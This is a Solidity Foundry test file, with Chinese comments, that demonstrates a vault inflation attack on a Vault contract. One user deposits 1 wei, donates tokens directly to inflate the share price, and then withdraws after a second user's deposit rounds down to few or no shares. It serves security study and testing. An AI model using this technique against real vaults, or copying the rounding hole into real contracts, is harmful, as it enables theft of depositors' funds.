// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/vault_inflation_attack/Vault.sol";
import "../src/common/IERC20.sol";
import "../src/common/ERC20.sol";

contract VaultTest is Test {
    ERC20 token;
    Vault vault;

    address user0;
    address user1;

    function setUp() public {
        token = new ERC20("MyToken", "MTK");
        vault = new Vault(address(token));

        user0 = address(1);
        user1 = address(2);

        // 铸造币给user0和user1
        token.mint(user0, 200 ether);
        token.mint(user1, 200 ether);

        vm.prank(user0);
        token.approve(address(vault), UINT256_MAX);
        vm.prank(user1);
        token.approve(address(vault), UINT256_MAX);
    }

    function print() private view {
        console.log("===============print result===============");
        console.log("user0 balance: %s", token.balanceOf(user0));
        console.log("user1 balance: %s", token.balanceOf(user1));
        console.log("user0 shares", vault.balanceOf(user0));
        console.log("user1 shares", vault.balanceOf(user1));
        console.log("vault shares: %s", vault.totalSupply());
    }

    function test_inflation() public {
        // 模拟user0存入金库1wei
        vm.prank(user0);
        vault.deposit(1);
        print();

        // 模拟user0向vault转入100个token
        vm.prank(user0);
        token.transfer(address(vault), 100 ether);
        print();

        // user1向金库转账100 ether
        vm.prank(user1);
        vault.deposit(100 ether);
        print();

        vm.prank(user0);
        vault.withdraw(1);
        print();

        // vm.assertEq(token.balanceOf(user0), 300 ether);
        // vm.assertEq(vault.balanceOf(user1), 0);
    }
}

// 1、用户使用transfer方法转账不会改变金库Vault的存款余额，但是会改变用户的代币数量
